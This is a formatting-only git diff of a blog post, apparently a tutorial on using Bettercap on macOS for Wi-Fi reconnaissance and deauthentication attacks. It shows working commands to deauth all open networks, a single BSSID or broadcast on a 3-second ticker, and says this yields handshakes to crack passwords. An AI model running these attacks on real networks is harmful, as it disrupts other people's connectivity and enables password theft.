@@ -38,7 +38,7 @@ brew install bettercap
 
 ## running
 
-Now, we can run Bettercap to look at what is around us. Please note that as an interface adapter I am using a new MacBook Pro, which has the Wireless adapter as `en0`. In your case, it might be `en1`. Check yours here `🍎 > About this mac > System Report > Network > Wi-Fi):
+Now, we can run Bettercap to look at what is around us. Please note that as an interface adapter I am using a new MacBook Pro, which has the Wireless adapter as `en0`. In your case, it might be `en1`. Check yours here `🍎 > About this mac > System Report > Network > Wi-Fi`):
 
 1. Disassociate a network
 ```
@@ -54,7 +54,6 @@ sudo bettercap -iface en0
 ```
 wifi.recon on
 ```
-
 After that you will sniff all traffic tranmitting around you:
 [![bettercap-monitor]({{ site.baseurl }}/assets/images/wifi-crack/bettercap-monitor.png)]({{ site.baseurl }}/assets/images/wifi-crack/bettercap-monitor.png){: .align-center}
 
@@ -62,34 +61,33 @@ After that you will sniff all traffic tranmitting around you:
 ```
 wifi.show
 ```
-
 [![wifi-show]({{ site.baseurl }}/assets/images/wifi-crack/wifi-show.png)]({{ site.baseurl }}/assets/images/wifi-crack/wifi-show.png){: .align-center}
 
-5. Now, let’s send deauthentication packets to networks. `wifi.deauth` starts sending [deauth packets][deauth] to the specified (BSSID) of the access point
+5.  Now, let’s send deauthentication packets to networks. `wifi.deauth` starts sending [deauth packets][deauth] to the specified (BSSID) of the access point.
 
-Open networks are those which aren’t protected by a passphrase.
+    Open networks which aren’t protected by a passphrase.
 ```
 set wifi.deauth.open true
 wifi.deauth all
 ```
 
-Or deauth only one Access Point with `11:11:11:11:11:11` BSSID
+
+    Or deauth only one Access Point with `11:11:11:11:11:11` BSSID
 ```
 wifi.deauth 11:11:11:11:11:11
 ```
 
-You can also to opt the broadcast to address `FF:FF:FF:FF:FF:FF`.
+    You can also to opt the broadcast to address `FF:FF:FF:FF:FF:FF`.
 
-To repeat it every 3 seconds run this
+    To repeat it every 3 seconds run this
 ```
 set ticker.period 3
 set ticker.commands wifi.deauth 11:11:11:11:11:11
 ticker on
 ```
-
 [![wifi-deauth]({{ site.baseurl }}/assets/images/wifi-crack/wifi-deauth.png)]({{ site.baseurl }}/assets/images/wifi-crack/wifi-deauth.png){: .align-center}
 
-A client has reauthenticated after being deauthenticated by bettercap and a handshake can be captured to [hack password](part1) or smth.else.
+    A client has reauthenticated after being deauthenticated by bettercap and a handshake can be captured to [hack password](part1) or smth.else.
 
 ## conclusion
 
@@ -104,5 +102,5 @@ If you have any questions on any of the modules that bettercap offers I suggest 
 * [Wikipedia. Wi-Fi deauthentication attack](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack) - some information about basic of attack
 
 [bettercap]: https://www.bettercap.org/intro/
-[part1]: {% post_url 2020-07-17-wifi-cracking.md %}
+[part1]: {% post_url 2020-07-17-wifi-cracking %}
 [deauth]: https://mrncciew.com/2014/10/11/802-11-mgmt-deauth-disassociation-frames/
